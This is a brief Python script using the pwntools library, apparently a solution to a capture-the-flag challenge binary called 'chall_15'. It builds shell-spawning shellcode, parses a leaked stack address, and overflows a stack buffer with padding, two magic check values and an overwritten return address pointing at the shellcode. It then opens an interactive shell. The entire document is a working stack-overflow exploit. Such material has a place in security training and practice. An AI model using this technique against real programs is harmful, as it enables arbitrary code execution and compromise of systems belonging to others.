# coding: utf-8
from pwn import *
elf=ELF("./chall_15")
context.arch="amd64"
shellcode = asm(shellcraft.sh())
#shellcode
#0x120
#len(shellcode)
#288-48
p=process("./chall_15")
p.recvuntil(b'\n')
leak = p.recv()
#leak
stackleak = int(leak,16)
payload = shellcode+b'a'*232+p32(0xdeadd00d)+p32(0xb16b00b5)+b'a'*8+p64(stackleak)
p.sendline(payload)
p.interactive()
